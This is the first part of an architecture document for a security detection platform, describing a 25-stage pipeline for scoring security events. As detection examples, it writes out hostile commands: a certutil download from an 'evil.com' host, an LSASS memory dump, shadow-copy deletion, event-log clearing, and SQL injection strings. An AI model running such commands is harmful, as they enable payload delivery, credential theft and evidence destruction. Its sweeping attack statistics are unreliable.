# JanuSec Platform: Live Event Processing Architecture
**Complete Technical & Business Breakdown**

*Last Updated: 2025-01-24*
*Version: 2.0 - Comprehensive Edition*

---

## 🎯 Executive Summary (30-Second Pitch)

**What it does**: Automatically analyzes thousands of security events per second from your entire tech stack (endpoints, network, cloud, email, identity systems) and tells you which ones are real threats vs. false alarms.

**Business value**: Reduces security analyst workload by 80-90%, cuts Mean Time to Detect (MTTD) from hours to seconds, and prevents alert fatigue.

**How**: Multi-stage AI + graph correlation + threat intelligence that learns what's normal for YOUR environment.

---

## 📊 Complete Event Flow (Step-by-Step with Business Context)

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     🔌 DATA INGESTION LAYER                              │
│  Business Problem: Security tools don't talk to each other              │
│  Solution: Universal adapter framework                                  │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐ │
│  │   EDR    │  │  SIEM    │  │ Network  │  │  Cloud   │  │   IAM    │ │
│  │CrowdStrik│  │ Splunk   │  │   Zeek   │  │AWS/Azure │  │  Okta    │ │
│  │Sentinel1 │  │ QRadar   │  │ Suricata │  │  GCP     │  │AzureAD   │ │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘ │
│       │             │              │             │             │        │
│       └─────────────┴──────────────┴─────────────┴─────────────┘        │
│                                    │                                     │
└────────────────────────────────────┼─────────────────────────────────────┘
                                     ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                    📋 EVENT NORMALIZATION                                │
│  Business Problem: Every vendor uses different field names              │
│  Technical Solution: Canonical schema mapping                           │
│  Architectural Decision: Map 50+ formats → 1 unified schema             │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Before:  Microsoft → "NewProcessName"                                  │
│           Splunk   → "process_name"                                     │
│           Zeek     → "orig_filename"                                    │
│                                                                          │
│  After:   ALL      → "process"                                          │
│                                                                          │
│  🔧 Code Location: src/api/routes/events.py:45                          │
│  🎯 Business Impact: Enables cross-vendor correlation                   │
│  💰 Cost: 5-10ms per event                                              │
└─────────────────────────────────────────────────────────────────────────┘
                                     │
                                     ▼
┌─────────────────────────────────────────────────────────────────────────┐
│          🏭 25-STAGE ANALYSIS PIPELINE (THE BRAIN)                       │
│  Business Problem: Too many alerts, 95% false positives                 │
│  Solution: Multi-layered detection with progressive enrichment          │
│  Architectural Decision: Fail-fast stages → heavier analysis only       │
│                          for suspicious events                          │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ┌──────────────────────────────────────────────────────────────────┐   │
│  │ 📍 STAGES 1-8: PRIMITIVE CHECKS (Fast Filters)                   │   │
│  │ Business: "Known good stuff, skip it immediately"                │   │
│  │ Technical: Hard-coded rules + allowlists                         │   │
│  ├──────────────────────────────────────────────────────────────────┤   │
│  │                                                                   │   │
│  │  STAGE 1: Allowlist Check                                        │   │
│  │  ────────────────────────────────────────────────────────────    │   │
│  │  🎯 Business Goal: Don't waste time on known-safe files          │   │
│  │  🔧 How It Works:                                                │   │
│  │     - Hash lookup: "Is this file in our trusted list?"           │   │
│  │     - Example: Microsoft's calc.exe → SKIP                       │   │
│  │  💡 Why This Matters:                                            │   │
│  │     - Reduces load by 30-40% instantly                           │   │
│  │     - Prevents "alert fatigue" on trusted software               │   │
│  │  📊 Metric: Suppressed events (+0.15 confidence boost if match)  │   │
│  │  🏗️ Architectural Decision:                                      │   │
│  │     - Keep allowlist in-memory (Redis) for speed                 │   │
│  │     - Per-tenant isolation (Company A's allowlist ≠ Company B)   │   │
│  │  ⚠️ Security Consideration:                                      │   │
│  │     - Risk: Attackers can abuse allowlisted apps (LOLBins)       │   │
│  │     - Mitigation: Later stages check for misuse patterns         │   │
│  │                                                                   │   │
│  │  STAGE 2: Temporal Dedup                                         │   │
│  │  ────────────────────────────────────────────────────────────    │   │
│  │  🎯 Business Goal: Stop seeing the same event 1000 times         │   │
│  │  🔧 How It Works:                                                │   │
│  │     - "Did we see this exact thing in last 5 minutes?"           │   │
│  │     - Tracks: (process + user + host + timestamp bucket)         │   │
│  │  💡 Example:                                                     │   │
│  │     - Chrome.exe spawns 50 times → Only analyze FIRST one        │   │
│  │  📊 Metric: Dedup rate (typically 60-70% reduction)              │   │
│  │  🏗️ Architectural Decision:                                      │   │
│  │     - Sliding window in Redis (5-min TTL)                        │   │
│  │     - Trade-off: Might miss rapid mutation attacks               │   │
│  │                                                                   │   │
│  │  STAGE 3: Baseline Drift Detection                              │   │
│  │  ────────────────────────────────────────────────────────────    │   │
│  │  🎯 Business Goal: "This never happened before = suspicious"     │   │
│  │  🔧 How It Works:                                                │   │
│  │     - Learn what's normal for each user/host over 14 days        │   │
│  │     - Example: "Alice NEVER ran PowerShell before... why now?"   │   │
│  │  💡 Real-World Scenario:                                         │   │
│  │     - Accountant suddenly runs Mimikatz → HUGE red flag          │   │
│  │     - DevOps runs Python scripts daily → Normal                  │   │
│  │  📊 Factor: baseline_deviation (+0.10 risk if first-time)        │   │
│  │  🏗️ Architectural Decision:                                      │   │
│  │     - Store per-user process history in PostgreSQL               │   │
│  │     - Retention: 90 days rolling window                          │   │
│  │  ⚠️ Security Consideration:                                      │   │
│  │     - Attackers can "baseline poison" (run bad stuff slowly)     │   │
│  │     - Mitigation: Combine with threat intel + graph analysis     │   │
│  │                                                                   │   │
│  │  STAGE 4: Geo Enrichment                                         │   │
│  │  ────────────────────────────────────────────────────────────    │   │
│  │  🎯 Business Goal: "Login from where?!"                          │   │
│  │  🔧 How It Works:                                                │   │
│  │     - IP → Country/City/ASN lookup (MaxMind GeoIP2)              │   │
│  │     - Add: latitude, longitude, ISP name                         │   │
│  │  💡 Example:                                                     │   │
│  │     - User in New York → Login from China 10 mins later          │   │
│  │     - Factor: impossible_travel (+0.14 risk)                     │   │
│  │  📊 Enrichment Fields: country, city, asn, lat, lon              │   │
│  │  🏗️ Architectural Decision:                                      │   │
│  │     - Local GeoIP database (no external API calls = fast)        │   │
│  │     - Update weekly via cron job                                 │   │
│  │  💰 Cost: ~$50/year for GeoLite2 license                         │   │
│  │                                                                   │   │
│  │  STAGE 5: Threat Intel IOC Matching                             │   │
│  │  ────────────────────────────────────────────────────────────    │   │
│  │  🎯 Business Goal: "Has anyone else seen this IP/domain/hash?"   │   │
│  │  🔧 How It Works:                                                │   │
│  │     - Check against 10+ threat feeds:                            │   │
│  │       • VirusTotal API (file hashes)                             │   │
│  │       • AlienVault OTX (IPs, domains)                            │   │
│  │       • Abuse.ch (malware URLs)                                  │   │
│  │       • Internal watchlist (your org's blocklist)                │   │
│  │  💡 Example:                                                     │   │
│  │     - File hash matches known ransomware → +0.30 risk            │   │
│  │  📊 Factor: threat_intel_match (severity based on feed)          │   │
│  │  🏗️ Architectural Decision:                                      │   │
│  │     - Cache results for 24h (reduce API costs)                   │   │
│  │     - Priority queue: Check free feeds first, paid only if       │   │
│  │       suspicion already high                                     │   │
│  │  💰 Cost: ~$200-500/month for VirusTotal Enterprise              │   │
│  │  ⚠️ Limitation: Zero-day attacks won't match any feeds           │   │
│  │                                                                   │   │
│  │  STAGE 6: User Role Context                                      │   │
│  │  ────────────────────────────────────────────────────────────    │   │
│  │  🎯 Business Goal: "Is this person supposed to do that?"         │   │
│  │  🔧 How It Works:                                                │   │
│  │     - Tag users: admin, developer, analyst, standard             │   │
│  │     - Cross-check: "Did non-admin run admin tool?"               │   │
│  │  💡 Example:                                                     │   │
│  │     - Marketing user runs Nmap → SUSPICIOUS                      │   │
│  │     - Security analyst runs Nmap → EXPECTED                      │   │
│  │  📊 Factor: privilege_mismatch (+0.08 risk)                      │   │
│  │  🏗️ Architectural Decision:                                      │   │
│  │     - Sync roles from AD/Okta daily                              │   │
│  │     - Store in PostgreSQL user_roles table                       │   │
│  │  ⚠️ Insider Threat: Even admins can go rogue!                    │   │
│  │                                                                   │   │
│  │  STAGE 7: Time Window Context                                    │   │
│  │  ────────────────────────────────────────────────────────────    │   │
│  │  🎯 Business Goal: "Why is this happening at 3 AM?"              │   │
│  │  🔧 How It Works:                                                │   │
│  │     - Office hours: 9 AM - 6 PM weekdays                         │   │
│  │     - Outside hours → Suspicious modifier                        │   │
│  │  💡 Example:                                                     │   │
│  │     - Database backup at 2 AM → NORMAL (scheduled job)           │   │
│  │     - Accountant Excel at 2 AM → SUSPICIOUS                      │   │
│  │  📊 Factor: off_hours_activity (+0.04-0.08 risk)                 │   │
│  │  🏗️ Architectural Decision:                                      │   │
│  │     - Per-tenant business hours config                           │   │
│  │     - Support multiple timezones for global orgs                 │   │
│  │                                                                   │   │
│  │  STAGE 8: Asset Criticality Weighting                           │   │
│  │  ────────────────────────────────────────────────────────────    │   │
│  │  🎯 Business Goal: "Not all servers are equal"                   │   │
│  │  🔧 How It Works:                                                │   │
│  │     - Tag assets: critical (DC, DB), high (web), low (workst.)   │   │
│  │     - Same attack on DC = 2x risk vs workstation                 │   │
│  │  💡 Example:                                                     │   │
│  │     - Port scan on domain controller → CRITICAL ALERT            │   │
│  │     - Port scan on dev laptop → Medium priority                  │   │
│  │  📊 Multiplier: 1.0x (low), 1.5x (high), 2.0x (critical)         │   │
│  │  🏗️ Architectural Decision:                                      │   │
│  │     - Import from CMDB/asset inventory                           │   │
│  │     - Fallback: Auto-tag DCs, databases via naming patterns      │   │
│  └──────────────────────────────────────────────────────────────────┘   │
│                                     │                                    │
│                                     ▼                                    │
│  ┌──────────────────────────────────────────────────────────────────┐   │
│  │ 🌐 STAGES 9-14: NETWORK ANALYSIS (Deep Packet Inspection)        │   │
│  │ Business: "What's happening on the wire?"                        │   │
│  │ Technical: Protocol analysis + anomaly detection                 │   │
│  ├──────────────────────────────────────────────────────────────────┤   │
│  │                                                                   │   │
│  │  STAGE 9: SSL/TLS Fingerprinting (JA3/JA3S/JA4/JARM)            │   │
│  │  ────────────────────────────────────────────────────────────    │   │
│  │  🎯 Business Goal: Detect malware using unusual encryption       │   │
│  │  🔧 How It Works:                                                │   │
│  │     - Every TLS client has unique "fingerprint" (cipher order)   │   │
│  │     - JA3: Client fingerprint                                    │   │
│  │     - JA3S: Server fingerprint                                   │   │
│  │     - JA4: Modern variant (supports TLS 1.3)                     │   │
│  │     - JARM: Server scan fingerprint                              │   │
│  │  💡 Example:                                                     │   │
│  │     - Chrome has 5 known JA3 values → NORMAL                     │   │
│  │     - Custom malware JA3 seen <10 times globally → RARE          │   │
│  │  📊 Factor: ssl:ja3_rare (+0.06), ssl:ja3s_rare (+0.04)          │   │
│  │  🏗️ Architectural Decision:                                      │   │
│  │     - Track JA3 frequency in Redis (30-day rolling window)       │   │
│  │     - Threshold: <100 occurrences = rare                         │   │
│  │  💡 Real Attack Caught: Cobalt Strike C2 has distinct JA3        │   │
│  │  ⚠️ Limitation: Encrypted traffic hides payload                  │   │
│  │                                                                   │   │
│  │  STAGE 10: DNS Tunnel Detection                                 │   │
│  │  ────────────────────────────────────────────────────────────    │   │
│  │  🎯 Business Goal: Catch data exfiltration via DNS               │   │
│  │  🔧 How It Works:                                                │   │
│  │     - Analyze DNS query patterns:                                │   │
│  │       • High entropy labels (random-looking)                     │   │
│  │       • Excessive queries per second (QPS > 20)                  │   │
│  │       • Long subdomain labels (>40 chars)                        │   │
│  │  💡 Example:                                                     │   │
│  │     - Normal: www.google.com                                     │   │
│  │     - Tunnel: a3f8d92e1b4c.evilserver.xyz (entropy = 0.95)       │   │
│  │  📊 Factor: dns:tunnel_entropy (+0.08), dns:qps_burst (+0.06)    │   │
│  │  🏗️ Architectural Decision:                                      │   │
│  │     - Sliding window counter (per domain, 60s buckets)           │   │
│  │     - Entropy calculation: Shannon entropy on label chars        │   │
│  │  💡 Real Attack: DNSCat2, Iodine tunneling tools                 │   │
│  │                                                                   │   │
│  │  STAGE 11: Beaconing Detection (C2 Heartbeats)                  │   │
│  │  ────────────────────────────────────────────────────────────    │   │
│  │  🎯 Business Goal: Find malware calling home regularly           │   │
│  │  🔧 How It Works:                                                │   │
│  │     - Track connection timing intervals                          │   │
│  │     - Calculate coefficient of variation (CV)                    │   │
│  │     - CV < 0.2 = highly periodic = suspicious                    │   │
│  │  💡 Example:                                                     │   │
│  │     - Malware beacons every 60 seconds: 60, 60, 60, 61, 60       │   │
│  │     - CV = 0.008 → BEACON DETECTED                               │   │
│  │     - Normal browsing: 5, 120, 3, 450, 12 → CV = 1.8 (random)    │   │
│  │  📊 Factor: net:beacon_periodic (+0.07)                          │   │
│  │  🏗️ Architectural Decision:                                      │   │
│  │     - Store last 20 connection timestamps per (src_ip, dst_ip)   │   │
│  │     - Memory: ~200 bytes × active connections                    │   │
│  │  💡 Real Attack: Cobalt Strike default beacon = 60s              │   │
│  │                                                                   │   │
│  │  STAGE 12: HTTP Anomaly Detection                               │   │
│  │  ────────────────────────────────────────────────────────────    │   │
│  │  🎯 Business Goal: Catch weird web requests                      │   │
│  │  🔧 How It Works:                                                │   │
│  │     - Rare User-Agent strings                                    │   │
│  │     - SQL injection patterns in URLs                             │   │
│  │     - Command injection (';', '|', etc.)                         │   │
│  │     - Directory traversal (../, %2e%2e)                          │   │
│  │  💡 Example:                                                     │   │
│  │     - User-Agent: "Mozilla/5.0..." → NORMAL                      │   │
│  │     - User-Agent: "python-requests/2.28" → SUSPICIOUS            │   │
│  │     - URL: /admin.php?id=1%20OR%201=1 → SQL INJECTION            │   │
│  │  📊 Factor: http:rare_ua (+0.04), http:injection (+0.12)         │   │
│  │  🏗️ Architectural Decision:                                      │   │
│  │     - Regex library for pattern matching                         │   │
│  │     - User-Agent frequency tracker (Redis)                       │   │
│  │                                                                   │   │
│  │  STAGE 13: Port Scan Detection                                  │   │
│  │  ────────────────────────────────────────────────────────────    │   │
│  │  🎯 Business Goal: Catch reconnaissance activity                 │   │
│  │  🔧 How It Works:                                                │   │
│  │     - Track unique dest ports per source IP                      │   │
│  │     - >20 ports in 5 minutes = vertical scan                     │   │
│  │     - >10 dest IPs on same port = horizontal scan                │   │
│  │  💡 Example:                                                     │   │
│  │     - Attacker tries: 192.168.1.50:22, :23, :80, :443... :8080   │   │
│  │     - 25 ports touched → PORT SCAN DETECTED                      │   │
│  │  📊 Factor: net:port_scan_vertical (+0.08)                       │   │
│  │  🏗️ Architectural Decision:                                      │   │
│  │     - Redis HyperLogLog (memory-efficient cardinality)           │   │
│  │     - 5-minute tumbling window                                   │   │
│  │  💡 Real Attack: Nmap, Masscan reconnaissance                    │   │
│  │                                                                   │   │
│  │  STAGE 14: Lateral Movement Detection                           │   │
│  │  ────────────────────────────────────────────────────────────    │   │
│  │  🎯 Business Goal: Stop attackers moving sideways                │   │
│  │  🔧 How It Works:                                                │   │
│  │     - Monitor internal protocols: SMB (445), RDP (3389),         │   │
│  │       WinRM (5985), SSH (22)                                     │   │
│  │     - Alert on: Workstation → Workstation connections            │   │
│  │       (Should go through server/jumpbox)                         │   │
│  │  💡 Example:                                                     │   │
│  │     - ws-alice → DC-01 via RDP → NORMAL (admin access)           │   │
│  │     - ws-alice → ws-bob via SMB → SUSPICIOUS (peer-to-peer)      │   │
│  │  📊 Factor: lateral_smb (+0.04), lateral_rdp (+0.06)             │   │
│  │  🏗️ Architectural Decision:                                      │   │
│  │     - Asset tier tagging (workstation, server, DC, DMZ)          │   │
│  │     - Policy: workstation→workstation on admin ports = alert     │   │
│  │  💡 Real Attack: Mimikatz pass-the-hash lateral movement         │   │
│  └──────────────────────────────────────────────────────────────────┘   │
│                                     │                                    │
│                                     ▼                                    │
│  ┌──────────────────────────────────────────────────────────────────┐   │
│  │ 🧠 STAGES 15-25: ADVANCED BEHAVIORAL (The Hard Stuff)            │   │
│  │ Business: "This LOOKS normal but ISN'T"                          │   │
│  │ Technical: Behavioral analytics + MITRE ATT&CK mapping           │   │
│  ├──────────────────────────────────────────────────────────────────┤   │
│  │                                                                   │   │
│  │  STAGE 15: Process Lineage Analysis                             │   │
│  │  ────────────────────────────────────────────────────────────    │   │
│  │  🎯 Business Goal: "That parent-child relationship is WEIRD"     │   │
│  │  🔧 How It Works:                                                │   │
│  │     - Track: Parent Process → Child Process chains               │   │
│  │     - Red flags:                                                 │   │
│  │       • Word.exe → PowerShell.exe (MACRO EXECUTION)              │   │
│  │       • Explorer.exe → cmd.exe → svchost.exe (SUSPICIOUS)        │   │
│  │       • Services.exe → Chrome.exe (SHOULD NEVER HAPPEN)          │   │
│  │  💡 Example - Normal:                                            │   │
│  │     - Explorer.exe → Chrome.exe ✅                                │   │
│  │  💡 Example - Attack:                                            │   │
│  │     - WinWord.exe → cmd.exe → powershell.exe → mimikatz.exe      │   │
│  │     - Factor: office_macro_spawn_powershell (+0.18 risk)         │   │
│  │  📊 MITRE Mapping: T1566.001 (Phishing: Spearphishing)           │   │
│  │  🏗️ Architectural Decision:                                      │   │
│  │     - Maintain process tree in-memory (30-min TTL)               │   │
│  │     - Store suspicious chains in PostgreSQL for hunting          │   │
│  │  ⚠️ Evasion: Attackers can use "legitimate" parent processes     │   │
│  │                                                                   │   │
│  │  STAGE 16: LOLBin (Living Off the Land) Detection               │   │
│  │  ────────────────────────────────────────────────────────────    │   │
│  │  🎯 Business Goal: Catch abuse of trusted Windows tools          │   │
│  │  🔧 How It Works:                                                │   │
│  │     - Monitor 200+ built-in Windows binaries:                    │   │
│  │       • certutil.exe (legit = download certs; abused = download  │   │
│  │         malware)                                                 │   │
│  │       • mshta.exe (legit = run HTA files; abused = code exec)    │   │
│  │       • regsvr32.exe (legit = register DLL; abused = run script) │   │
│  │       • bitsadmin.exe (legit = background transfers; abused =    │   │
│  │         C2 download)                                             │   │
│  │  💡 Example:                                                     │   │
│  │     - Normal: certutil.exe -verify certificate.cer               │   │
│  │     - Malicious: certutil.exe -urlcache -f http://evil.com/      │   │
│  │       payload.exe                                                │   │
│  │  📊 Factor: lolbin_misuse (+0.20 risk)                           │   │
│  │  🏗️ Architectural Decision:                                      │   │
│  │     - Curated LOLBin list from LOLBAS project                    │   │
│  │     - Pattern matching on command-line args                      │   │
│  │  💡 Real Attack: 70% of APT attacks use LOLBins                  │   │
│  │  ⚠️ False Positive Risk: Sysadmins use these legitimately!       │   │
│  │                                                                   │   │
│  │  STAGE 17: Persistence Mechanism Detection                      │   │
│  │  ────────────────────────────────────────────────────────────    │   │
│  │  🎯 Business Goal: Find malware trying to "survive reboot"       │   │
│  │  🔧 How It Works:                                                │   │
│  │     - Monitor registry keys:                                     │   │
│  │       • HKLM\Software\Microsoft\Windows\CurrentVersion\Run       │   │
│  │       • HKCU\...\RunOnce                                         │   │
│  │       • Services keys                                            │   │
│  │     - Monitor scheduled tasks (schtasks.exe)                     │   │
│  │     - Monitor WMI Event Consumers                                │   │
│  │  💡 Example:                                                     │   │
│  │     - New registry Run key: "C:\Temp\evil.exe" → PERSISTENT      │   │
│  │     - New scheduled task: daily at 2 AM → CHECK IT               │   │
│  │  📊 Factor: persistence_registry (+0.12),                        │   │
│  │            persistence_scheduled_task (+0.14)                    │   │
│  │  🏗️ Architectural Decision:                                      │   │
│  │     - Baseline known-good persistence (Dropbox, Zoom, etc.)      │   │
│  │     - Alert only on NEW persistence entries                      │   │
│  │  💡 Real Attack: TrickBot uses registry + WMI persistence        │   │
│  │                                                                   │   │
│  │  STAGE 18: Privilege Escalation Detection                       │   │
│  │  ────────────────────────────────────────────────────────────    │   │
│  │  🎯 Business Goal: Stop attackers gaining admin rights           │   │
│  │  🔧 How It Works:                                                │   │
│  │     - Token manipulation (SeDebugPrivilege)                      │   │
│  │     - UAC bypass techniques (fodhelper, eventvwr)                │   │
│  │     - Service creation with SYSTEM privileges                    │   │
│  │     - DLL hijacking / search order hijacking                     │   │
│  │  💡 Example:                                                     │   │
│  │     - Standard user → Run process as SYSTEM → ESCALATION         │   │
│  │  📊 Factor: privilege_escalation (+0.12),                        │   │
│  │            uac_bypass_fodhelper (+0.14)                          │   │
│  │  🏗️ Architectural Decision:                                      │   │
│  │     - Monitor Sysmon Event ID 10 (Process Access)                │   │
│  │     - Check for privilege token changes                          │   │
│  │  💡 Real Attack: Metasploit getsystem module                     │   │
│  │                                                                   │   │
│  │  STAGE 19: Credential Access Detection                          │   │
│  │  ────────────────────────────────────────────────────────────    │   │
│  │  🎯 Business Goal: Catch password/hash theft                     │   │
│  │  🔧 How It Works:                                                │   │
│  │     - LSASS memory dump (Mimikatz, ProcDump)                     │   │
│  │     - SAM database access                                        │   │
│  │     - Credential dumping from registry                           │   │
│  │     - DCSync attack (replicating AD passwords)                   │   │
│  │     - Kerberoasting (request service tickets)                    │   │
│  │  💡 Example:                                                     │   │
│  │     - procdump.exe -ma lsass.exe dump.dmp → CREDENTIAL THEFT     │   │
│  │     - Event ID 4662: "Replication of Directory Changes" from     │   │
│  │       non-DC → DCSYNC ATTACK                                     │   │
│  │  📊 Factor: credential_lsass_dump (+0.18),                       │   │
│  │            credential_dcsync (+0.22)                             │   │
│  │  🏗️ Architectural Decision:                                      │   │
│  │     - Monitor LSASS process access (Sysmon Event ID 10)          │   │
│  │     - AD replication event monitoring (Event ID 4662)            │   │
│  │  💡 Real Attack: 95% of ransomware uses credential theft         │   │
│  │                                                                   │   │
│  │  STAGE 20: Data Staging Detection                               │   │
│  │  ────────────────────────────────────────────────────────────    │   │
│  │  🎯 Business Goal: Catch data prep before exfiltration           │   │
│  │  🔧 How It Works:                                                │   │
│  │     - Large archive creation (>100 MB .zip, .rar, .7z)           │   │
│  │     - Compression utilities run by non-admins                    │   │
│  │     - Files moved to staging directory (Temp, Recycle Bin)       │   │
│  │  💡 Example:                                                     │   │
│  │     - 7z.exe a -r C:\Temp\data.7z C:\Shares\Finance\             │   │
│  │     - 500 MB archive in Temp folder → STAGING DETECTED           │   │
│  │  📊 Factor: data_staging_compress (+0.10)                        │   │
│  │  🏗️ Architectural Decision:                                      │   │
│  │     - Monitor file creation events (Sysmon Event ID 11)          │   │
│  │     - Track cumulative file size in "suspicious" dirs            │   │
│  │                                                                   │   │
│  │  STAGE 21: Domain Trust Abuse Detection                         │   │
│  │  ────────────────────────────────────────────────────────────    │   │
│  │  🎯 Business Goal: Catch cross-domain attacks in enterprises     │   │
│  │  🔧 How It Works:                                                │   │
│  │     - Monitor SID history modifications                          │   │
│  │     - Unusual cross-domain authentication                        │   │
│  │     - Trust relationship changes                                 │   │
│  │  💡 Example:                                                     │   │
│  │     - User from corp.local authenticates to dev.corp.local       │   │
│  │       with Enterprise Admin SID → GOLDEN TICKET ATTACK           │   │
│  │  📊 Factor: domain_trust_abuse (+0.10)                           │   │
│  │                                                                   │   │
│  │  STAGE 22: Script Obfuscation Detection                         │   │
│  │  ────────────────────────────────────────────────────────────    │   │
│  │  🎯 Business Goal: Find hidden/encoded malicious scripts         │   │
│  │  🔧 How It Works:                                                │   │
│  │     - PowerShell -EncodedCommand (Base64)                        │   │
│  │     - Multiple encoding layers                                   │   │
│  │     - Uncommon string concatenation                              │   │
│  │     - High entropy in script content                             │   │
│  │  💡 Example:                                                     │   │
│  │     - Normal: Get-Process | Where-Object {$_.CPU -gt 100}        │   │
│  │     - Obfuscated: powershell.exe -enc                            │   │
│  │       JABhAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AH...          │   │
│  │  📊 Factor: powershell_encoded_command (+0.14),                  │   │
│  │            script_encoded_block (+0.14)                          │   │
│  │  🏗️ Architectural Decision:                                      │   │
│  │     - Decode Base64 and scan decoded content                     │   │
│  │     - Entropy calculation: Shannon entropy > 4.5 = suspicious    │   │
│  │  💡 Real Attack: 80% of PowerShell malware uses -enc             │   │
│  │                                                                   │   │
│  │  STAGE 23: Office Macro Analysis                                │   │
│  │  ────────────────────────────────────────────────────────────    │   │
│  │  🎯 Business Goal: Catch malicious Word/Excel macros             │   │
│  │  🔧 How It Works:                                                │   │
│  │     - Auto-execute macros (AutoOpen, Workbook_Open)              │   │
│  │     - Suspicious API calls (Shell, WScript.Shell)                │   │
│  │     - Download functions (URLDownloadToFile)                     │   │
│  │  💡 Example:                                                     │   │
│  │     - Invoice.docm → AutoOpen → powershell.exe → payload.exe     │   │
│  │  📊 Factor: macro_autoexec (+0.16)                               │   │
│  │  🏗️ Architectural Decision:                                      │   │
│  │     - Office file monitoring via Sysmon                          │   │
│  │     - Process lineage check (Stage 15 correlation)               │   │
│  │  💡 Real Attack: Emotet, Dridex phishing campaigns               │   │
│  │                                                                   │   │
│  │  STAGE 24: Remote Execution Tool Detection                      │   │
│  │  ────────────────────────────────────────────────────────────    │   │
│  │  🎯 Business Goal: Catch remote admin tool abuse                 │   │
│  │  🔧 How It Works:                                                │   │
│  │     - PsExec.exe (Sysinternals remote exec)                      │   │
│  │     - WMI remote process creation                                │   │
│  │     - WinRM remote PowerShell sessions                           │   │
│  │     - DCOM-based execution                                       │   │
│  │  💡 Example:                                                     │   │
│  │     - PsExec.exe \\ws-victim cmd.exe → REMOTE EXEC               │   │
│  │  📊 Factor: remote_psexec (+0.12), remote_wmi (+0.10)            │   │
│  │  🏗️ Architectural Decision:                                      │   │
│  │     - Whitelist IT admin IPs for PsExec use                      │   │
│  │     - Monitor Sysmon Event ID 1 + network source IP              │   │
│  │  ⚠️ Challenge: IT uses PsExec legitimately!                      │   │
│  │                                                                   │   │
│  │  STAGE 25: Anti-Forensics Detection                             │   │
│  │  ────────────────────────────────────────────────────────────    │   │
│  │  🎯 Business Goal: Catch attackers covering their tracks         │   │
│  │  🔧 How It Works:                                                │   │
│  │     - Event log clearing (wevtutil.exe cl)                       │   │
│  │     - Timestomping (file time modification)                      │   │
│  │     - Volume shadow copy deletion (vssadmin delete)              │   │
│  │     - Indicator removal (clearing Prefetch, USN journal)         │   │
│  │  💡 Example:                                                     │   │
│  │     - wevtutil.exe cl Security → LOG CLEARING (Event ID 1102)    │   │
│  │     - vssadmin delete shadows /all → RANSOMWARE PREP             │   │
│  │  📊 Factor: anti_forensics_log_clear (+0.10),                    │   │
│  │            anti_forensics_vss_delete (+0.18)                     │   │
│  │  🏗️ Architectural Decision:                                      │   │
│  │     - Forward logs to external SIEM immediately                  │   │
│  │     - Alert on Event ID 1102 (Security log cleared)              │   │
│  │  💡 Real Attack: 100% of ransomware deletes shadow copies        │   │
│  └──────────────────────────────────────────────────────────────────┘   │
│                                     │                                    │
└─────────────────────────────────────┼─────────────────────────────────────┘
                                      ▼
                        *** (Continued in Part 2) ***
